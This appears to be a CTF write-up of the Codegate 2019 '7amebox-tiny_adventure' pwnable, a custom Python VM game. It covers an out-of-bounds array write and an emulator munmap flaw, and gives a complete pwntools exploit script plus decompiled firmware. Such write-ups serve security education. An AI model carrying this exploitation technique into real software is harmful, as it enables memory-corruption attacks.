+++
title = "Codegate CTF 2019 - 7amebox-tiny_adventure"
date = "2024-07-29"
description = "Codegate CTF 2019 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "vm", "improper check", "out of bound"]
+++

## 0x00. Introduction
The basic structure is the same as [7amebox-name](../Codegate-CTF-2019-Quals-7amebox-name/).

``` bash
➜  ls -al
total 64
drwxr-xr-x  2 user user  4096 Jul 30 08:48 .
drwxr-x--- 24 user user  4096 Jul 30 08:48 ..
-rw-r--r--  1 user user   579 Jul 17 03:06 Dockerfile
-rwxr-xr-x  1 user user 30804 Jul 17 03:06 _7amebox_patched.py
-rw-r--r--  1 user user    41 Jul 17 03:06 flag
-rwxr-xr-x  1 user user    21 Jul 17 03:06 run.sh
-rw-r--r--  1 user user  3600 Jul 17 03:06 stage.map
-rw-r--r--  1 user user  3721 Jul 17 03:06 tiny_adventure.firm
-rwxr-xr-x  1 user user   371 Jul 17 03:06 vm_tiny.py
```

### Global variables
``` c
int dog_count_0x1000;
int *dog_avatar_0x1003[0x100];
int *map_0x1303;
int sell_count_0x1306;
int hp_0x1309;
int power_0x130c;
int x_0x130f;
int y_0x1312;
```

### Concept
``` bash
1) show current map
2) buy a dog
3) sell a dog
4) direction help
w a s d) move to direction
>1
-------------------------------------------------
* (\x2a)      = power up
# (\x23)      = wall
@ (\x40)      = you
a ~ y         = monster
z             = boss monster (flag)
-------------------------------------------------

##############################################################
#@                                                           #
#                                     a  f                   #
#                                                            #
#   v            z                                           #
#                     i            p                         #
                            ...                              
##############################################################
```

After reading the `stage.map` file and loading it into memory, you move using `w`, `a`, `s`, `d`, and when you defeat a monster, you acquire the generated `*` to power up.
There are also `buy_dog` and `sell_dog` menus for triggering vulnerabilities.

### Goal
``` c
void move_0x383(char choice) {
    ...
_0x534_boss:
    print_0x6a5("you met a boss monster 'z'!\n1) attack\n2) attack\n>");
    read_0x669(choice, 3);

    if(hp_0x1309 < 0x7d0)
        hp_0x1309 = 0;
    else
        hp_0x1309 -= 0x7d0;
    
    if(power_0x130c < 0x2bc)
        *(new_loc) = met;
    else
        flag_0x5bf();
    ...
}
```

When you meet `z` in `stage.map`, the boss stage opens, and regardless of `hp`, if `power` is greater than or equal to `0x2bc`, it prints the flag.

However, even if you defeat all the monsters on the `map`, you cannot make the `power` value greater than `0x2bc`, so I decided to exploit by manipulating the `map` information.


## 0x01. Vulnerability
In the `load_map_0x103()` function that runs first after firmware loading, the global variables are initialized as follows:

``` c
int load_map_0x103() {
    int new_page;   // 0xf5fc5
    int ;           // 0xf5fc8
    int r0;
    
    dog_count_0x1000 = 0;
    memset_0x61b(dog_avatar_0x1003, 0x0, 0x300);
    sell_count_0x1306 = 6;
    hp_0x1309 = 0x78;
    power_0x130c = 0x61;
    x_0x130f = 0;
    y_0x1312 = 0;

    r0 = syscall(0x4, new_page, 0x6);       // mmap(new_page, O_READ | O_WRITE); 0x59000
    map_0x1303 = new_page;
    r0 = open("stage.map");
    syscall(0x3, r0, map_0x1303, 0xe10);    // read(fd, map_0x1303, 0xe10);
    return new_page;
}
```

Among these, `dog_avatar_0x1003` is used as follows:

``` c
void buy_dog_0x25c() {
    int choice;
    int new_page;
    int r0;

    r0 = syscall(0x4, new_page, 0x6);  // new_page = mmap(O_READ | O_WRITE);
    if(r0 == 0)
        goto _0x2e5;

    dog_count_0x1000++;
    dog_avatar_0x1003[dog_count_0x1000] = new_page;
    print_0x6a5("do you want to draw a avatar of the dog? (y/n)");
    read_0x669(choice, 0x3);
    if(choice == 'y') {
        read_0x669(new_page, 0x1000);
        print_0x6a5("you got a new dog!");
        goto _0x2fe;
    }
    print_0x6a5("you got a new dog!");

_0x2e5:
    print_0x6a5("you already have too many dogs!");
_0x2fe:
    return;
}
```

If memory allocation through `syscall` succeeds, `dog_count_0x1000` increases and the allocated memory region address is written to that index.

However, since there's no boundary check for `dog_count_0x1000`, when the value becomes `0x101`, we can write a value to `map_0x1303` which is after the `dog_avatar_0x1003` array.
Since `map_0x1303` holds the memory address where the contents of `stage.map` are read and stored, manipulating this allows us to manipulate the `map`.
Moreover, we can write `0x1000` bytes to the allocated memory for drawing `avatar`, allowing us to freely manipulate the `map` contents.

``` bash
[*] allocating 0xfa-th page
addr : 0x17000
new perm : 0b1110
do you want to draw a avatar of the dog? (y/n)
>n
[*] allocating 0xfb-th page
addr : 0x78000
new perm : 0b1110
do you want to draw a avatar of the dog? (y/n)
>n
[*] allocating 0xfc-th page
you already have too many dogs!
```

The problem is that only `0xfb` allocations are made and it fails.
When I checked the reason:

``` bash
gef > mmap
0x0     : r-x
0x1000  : rw-
0x59000 : rw-
0xf4000 : rw-
0xf5000 : rw-
```

There are already allocated pages and the emulator only saves the `0x0` ~ `0xff000` region as the allocatable area.

``` python
class Memory:
    def __init__(self, size):
        self.memory = [0 for i in range(size)]
        self.pages = {}
        for page in range(0, size, 0x1000):
            self.pages[page] = 0
...
class EMU:
    def __init__(self):
        ...
        self.memory     = Memory(2 ** 20)   # 0x100000
        ...
```

Therefore, we need to increase the `dog_count_0x1000` value, which acts as an index, from `0xfb` to `0x101` using another vulnerability.
Since the `sell_count_0x1306` value is exactly that difference of `0x6`, we can reasonably infer that we should use `sell_dog_0x304()`.

``` c
void sell_dog_0x304() {
    int choice;     // 0xf5fc5
    int new_page;   // 0xf5fc8

    if(sell_count_0x1306 == 0)
        goto _0x373;
    sell_count_0x1306--;
    print_0x6a5("which dog do you want to sell?");
    read_0x669(choice, 0x4);
    if(choice < 0x100000)
        goto _0x373;
    syscall(0x6, choice);   // munmap(choice);
    print_0x6a5("good bye my dog..");
    goto _0x37d;
_0x373:
    print_0x6a5("you can't sell the dog!");
_0x37d:
    return;
}
```

However, looking at the code for `sell_dog_0x304()`, if the address to unmap is less than `0x100000`, the `syscall` cannot be called.
But I remembered that unmapping succeeded when I entered `AAAA` during dynamic analysis, so I checked the emulator code.

``` python
class EMU:
    ...
    def sys_s6(self):   # munmap
        addr = self.register.get_register('r1') & 0b111111111000000000000
        self.memory.set_perm(addr, 0b0000)
    ...
class Memory:
    ...
    def set_perm(self, addr, perm):
        self.pages[addr & 0b111111111000000000000] = perm & 0b1111
    ...
```

When `sys_s6()` is called in the emulator, it sets the page's permission to `0b0000` through the `Memory` object's `set_perm()` function.
In this process, however, it doesn't check if the page exists before setting the permission.
And in Python's dictionary, when you input a value to a non-existent key, it creates and stores a new key-value pair.

Therefore, even the non-existent region `AAAA` could be unmapped, and since this region is stored in the `pages` dictionary, allocation is also possible.
Of course, if you try to write or read values after allocation, it exceeds the memory size and causes an error.
However, since the purpose is to increase `dog_count_0x1000`, we just need to perform `munmap` -> `map` 6 times and write the `map` information to a writable area.


## 0x02. Exploit
The emulator's memory allocation process is as follows:

``` python
    def allocate(self, new_perm, addr=None):
        if addr:
            if not (self.get_perm(addr) & PERM_MAPPED):
                self.set_perm(addr, (PERM_MAPPED | new_perm) & 0b1111)
                return addr
            else:
                return -1

        for page, perm in self.pages.items():
            if not (self.get_perm(page) & PERM_MAPPED):
                self.set_perm(page, (PERM_MAPPED | new_perm) & 0b1111)
                return page
        return -1
```

When `addr` is not specified, it iterates through the `pages` dictionary and returns a `page` without the `PERM_MAPPED` permission.

In Python 2.7, dictionaries are traversed in random order, and even if you add values later, the order doesn't come at the end but can be inserted in the middle.

``` python
# Python 2.7.18
>>> a = {"A" : 1, "B" : 2, "C" : 3, "D" : 4}
>>> for key in a:
...     print key,
... 
A C B D
>>> a["E"] = 5
>>> for key in a:
...     print key,
... 
A C B E D
```

Therefore, if we add a key-value to the `Memory` object's `pages` dictionary, there are high chances that the key will be inserted in the middle.
Indeed, if we follow the process of the emulator creating the `pages` dictionary and unmapping, we can get the following result:

``` python
>>> pages = {}
>>> for page in range(0, 2 ** 20, 0x1000):                      # Memory.__init__()
...     pages[page] = 0
... 
>>> pages[0x100000] = 0                                         # Memory.set_perm()
>>> for index, (page, perm) in enumerate(pages.items()):        # Memory.allocate()
...     if page == 0x100000:
...         print "page 0x100000 is at %d-th index" % index
... 
page 0x100000 is at 98-th index
>>> print "last page %s is at %d-th index" % (hex(page), index)
last page 0x78000 is at 256-th index
```

Therefore, to allocate all regions except the last `page` at `0x78000`, I structured the payload as follows:

``` python
    for i in range(0xfa):
        log.info(f"buying : {hex(i + 1)} / 0xfa")
        buy_dog(s, b"n")
```

Now `dog_count_0x1000` has increased to `0xfa`, and the method to increase `0x6` times more using `sell_dog_0x304()` is as follows:

``` python
    for i in range(6):
        log.info(f"selling and buying : {hex(i + 1)} / 0x6")
        sell_dog(s, 0x100000)
        buy_dog(s, b"n")
```

Finally, when the remaining `0x78000` memory is allocated, `dog_count_0x1000` becomes `0x101` and `map_0x1303` gets overwritten with `0x78000`.

Now the value input to draw the `avatar` becomes the `map` information as is, so the payload to fill the entire `map` with `*` meaning power up except for `@`(my location) and the `z`(boss) is as follows:

``` python
    payload = b"@"
    payload += b"*" * 3598
    payload += b"z"
    buy_dog(s, b"y", payload)
```

Now all that's left is to sufficiently increase `power` and fight the boss.
The condition to beat the boss is that `power` must be greater than or equal to 0x2bc, and power up increases `power` by `0x5`, so a minimum 121 times of power ups are needed.
Since all positions on the current `map` are filled with `*`, we just need to move anywhere we haven't been before 121 times.

``` python
    for i in range(2):
        for j in range(60):
            log.info(f"farming...")
            move(s, b"d")
        move(s, b"s")
    move(s, b"w")
    move(s, b"w")
    move(s, b"w")
    move(s, b"a")
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from gameboxlib import *
from time import sleep
import sys

BINARY = "./vm_tiny.py"

bp = {
    'read_of_sell_dog' : 0x341,
    'direction_help' : 0xbf,
}
context.terminal = ['tmux', 'splitw', '-hf']

def set_bp(s, addr):
    s.recv()
    s.sendline(f"b {hex(addr)}".encode())
    sleep(0.1)
    s.sendline(b"c")
    return s.recv()

def buy_dog(s, draw, avatar=""):
    s.sendline(b"2")
    print(s.recvuntil(b">").decode())
    s.sendline(draw)
    if draw == b'y':
        s.sendline(avatar)
    return s.recvuntil(b">")

def sell_dog(s, addr):
    s.sendline(b"3")
    s.recvuntil(b">")
    if type(addr) == bytes:
        s.sendline(addr)
    else:
        s.sendline(p21(addr))
    return s.recvuntil(b">")

def move(s, direction):
    s.sendline(direction)
    return s.recvuntil(b">")

def main():
    if(len(sys.argv) > 1):
        s = remote("localhost", int(sys.argv[1]))
    else:
        s = process(BINARY)
        print(set_bp(s, bp['direction_help']).decode())
    s.recvuntil(b">")

    for i in range(0xfa):
        log.info(f"buying : {hex(i + 1)} / 0xfa")
        buy_dog(s, b"n")

    for i in range(6):
        log.info(f"selling and buying : {hex(i + 1)} / 0x6")
        sell_dog(s, 0x100000)
        buy_dog(s, b"n")

    payload = b"@"
    payload += b"*" * 3598
    payload += b"z"
    buy_dog(s, b"y", payload)

    for i in range(2):
        for j in range(60):
            log.info(f"farming...")
            move(s, b"d")
        move(s, b"s")
    move(s, b"w")
    move(s, b"w")
    move(s, b"w")
    move(s, b"a")
    
    log.info(f"fight!!!")
    s.sendline(b"1")
    print(s.recvuntil(b"}").split(b"\n")[-1])

if __name__=='__main__':
    main()
```


## 0x04. Decompile
``` c
#define O_MAPPED 0b1000
#define O_READ   0b0100
#define O_WRITE  0b0010
#define O_EXEC   0b0001
char *str_0x6e2 = "====================================================\
                |                PWN ADVENTURE V8.6                |\
                ====================================================\
                |               __                                 |\
                |             _|^ |________                        |\
                |            (____|        |___                    |\
                |                 |________|                       |\
                |                  | |   | |                       |\
                |                                                  |\
                ----------------------------------------------------";
char *str_0xc66 = "====================================================\
                |                  YOU WERE DEAD!                  |\
                ====================================================\
                | HP : 0                                           |\
                |                                                  |\
                |                                                  |\
                |                       ...                        |\
                |                       ___                        |\
                |                      |___|                       |\
                ----------------------------------------------------";
char *str_0x6a5 = "   direction\
                 ________________________________\
                |          W : north             |\
                | A : west             D : east  |\
                |          S : south             |\
                |________________________________|";
char *str_0x9c5 = "-------------------------------------------------\
                * (\x2a)      = power up\
                # (\x23)      = wall\
                @ (\x40)      = you\
                a ~ y         = monster\
                z             = boss monster (flag)\
                -------------------------------------------------";
int dog_count_0x1000;
int *dog_avatar_0x1003[0x100];
int *map_0x1303;
int sell_count_0x1306;
int hp_0x1309;
int power_0x130c;
int x_0x130f;
int y_0x1312;

int read_0x669(int r0, int r1) {
    syscall(0x3, 0x0, r0, r1);  // read(stdin, r0, r1);
}

void memset_0x61b(int *addr, char value, int len) {
    for(int i=0; i<len; i++)
        *(addr + i) = value;
}

int load_map_0x103() {
    int new_page;   // 0xf5fc5
    int ;           // 0xf5fc8
    int r0;
    
    dog_count_0x1000 = 0;
    memset_0x61b(dog_avatar_0x1003, 0x0, 0x300);
    sell_count_0x1306 = 6;
    hp_0x1309 = 0x78;
    power_0x130c = 0x61;
    x_0x130f = 0;
    y_0x1312 = 0;

    r0 = syscall(0x4, new_page, 0x6);       // mmap(new_page, O_READ | O_WRITE); 0x59000
    map_0x1303 = new_page;
    r0 = open("stage.map");
    syscall(0x3, r0, map_0x1303, 0xe10);    // read(fd, map_0x1303, 0xe10);
    return new_page;
}

int hp_check_0x1af() {
    int r0;
    r0 = hp_0x1309;

    if(r0 <= 0) {
        print(str_0xc66);
        r0 = 0;
        goto _0x1e0;
    }
    r0 = 1;
_0x1e0:
    return;
}

void show_map_0x1e6() {
    int r0;

    print_0x6a5(str_0x9c5);
    print_0x6a5("##############################################################");
    r0 = map_0x1303;
    for(int i=0; i<60; i++) {
        write_0x687(1, "#");
        write_0x687(60, r0 + 60 * i);
        write_0x687(1, "#");
    }
    print_0x6a5("##############################################################");
}

void buy_dog_0x25c() {
    int choice;
    int new_page;
    int r0;

    r0 = syscall(0x4, new_page, 0x6);  // new_page = mmap(O_READ | O_WRITE);
    if(r0 == 0)
        goto _0x2e5;

    dog_count_0x1000++;
    dog_avatar_0x1003[dog_count_0x1000] = new_page;
    print_0x6a5("do you want to draw a avatar of the dog? (y/n)");
    read_0x669(choice, 0x3);
    if(choice == 'y') {
        read_0x669(new_page, 0x1000);
        print_0x6a5("you got a new dog!");
        goto _0x2fe;
    }
    print_0x6a5("you got a new dog!");

_0x2e5:
    print_0x6a5("you already have too many dogs!");
_0x2fe:
    return;
}

void sell_dog_0x304() {
    int choice;     // 0xf5fc5
    int new_page;   // 0xf5fc8

    if(sell_count_0x1306 == 0)
        goto _0x373;
    sell_count_0x1306--;
    print_0x6a5("which dog do you want to sell?");
    read_0x669(choice, 0x4);
    if(choice < 0x100000)
        goto _0x373;
    syscall(0x6, choice);   // munmap(choice);
    print_0x6a5("good bye my dog..");
    goto _0x37d;
_0x373:
    print_0x6a5("you can't sell the dog!");
_0x37d:
    return;
}

void move_0x383(char choice) {
    char *new_loc;  // 0xf5fbf
    int map;        // 0xf5fc2
    int choice;     // 0xf5fc5
    char tmp[3];    // 0xf5fc8
    int r0, met, r8, r9;
    char *r5;

    tmp[0] = choice;
    r0 = *map_0x1303;
    map = r0;
    r8 = x_0x130f;
    r9 = y_0x1312;

    r5 = r0 + x_0x130f + y_0x1312 * 60;
    if(*r5 == '@')
        *r5 = ' ';
    if(tmp[0] == 'w')
        y_0x1312 = (y_0x1312 - 1) % 60;
    else if(tmp[0] == 'a')
        x_0x130f = (x_0x130f - 1) % 60;
    else if(tmp[0] == 's')
        y_0x1312 = (y_0x1312 + 1) % 60;
    else
        x_0x130f = (x_0x130f + 1) % 60;

    new_loc = map + x_0x130f + y_0x1312 * 60;
    met = *(new_loc);
    *(new_loc) = '@';
    if(met == ' ')
        goto _0x59f_return;
    else if(met == '*')
        goto _0x505_power_up;
    else if(met == 'z')
        goto _0x534_boss;
    else if(met < 'a' || met > 'z')
        goto _0x59f_return;
    print_0x6a5("you met a monster\n1) attack\n2) attack\n>");
    read_0x669(choice, 3);
    if(hp_0x1309 < 30)
        hp_0x1309 = 0;
    else
        hp_0x1309 -= 30;

    if(met > power_0x130c) {
        *(new_loc) = met;
        goto _0x59f_return;
    }
    *(new_loc) = '*';
    goto _0x59f_return;

_0x505_power_up:
    hp_0x1309 += 40;
    power_0x130c += 5;
    print_0x6a5("power up!");
    goto _0x59f_return;
_0x534_boss:
    print_0x6a5("you met a boss monster 'z'!\n1) attack\n2) attack\n>");
    read_0x669(choice, 3);

    if(hp_0x1309 < 0x7d0)
        hp_0x1309 = 0;
    else
        hp_0x1309 -= 0x7d0;
    
    if(power_0x130c < 0x2bc)
        *(new_loc) = met;
    else
        flag_0x5bf();
_0x59f_return:
    return;
}

void flag_0x5bf() {
    char buf[60];
    int r0;
    memset_0x61b(buf, 0, 60);

    r0 = syscall(0x1, 0xe7a);    // open("flag");
    syscall(0x3, r0, buf, 60);   // read(fd, buf, 60);
    print_0x6a5(buf);

    syscall(0x0);                // exit(0);
    return;
}

void main() {
    int choice;
    int ;
    int r0;

    print_0x6a5(str_0x6e2);
    
    load_map_0x103();
    while(hp_check_0x1af() != 0) {
        print_0x6a5("1) show current map\n2) buy a dog\n3) sell a dog\n4) direction help\nw a s d) move to direction\n>");
        choice = 0;
        read_0x669(choice, 0x3);
        if(choice == '1')
            show_map_0x1e6();
        else if(choice == '2')
            buy_dog_0x25c();
        else if(choice == '3')
            sell_dog_0x304();
        else if(choice == '4')
            print_0x6a5(str_0x6a5);
        else if(choice == 'w')
            move_0x383(choice);
        else if(choice == 'a')
            move_0x383(choice);
        else if(choice == 's')
            move_0x383(choice);
        else if(choice == 'd')
            move_0x383(choice);
    }
_0xfd:
    return;
}
```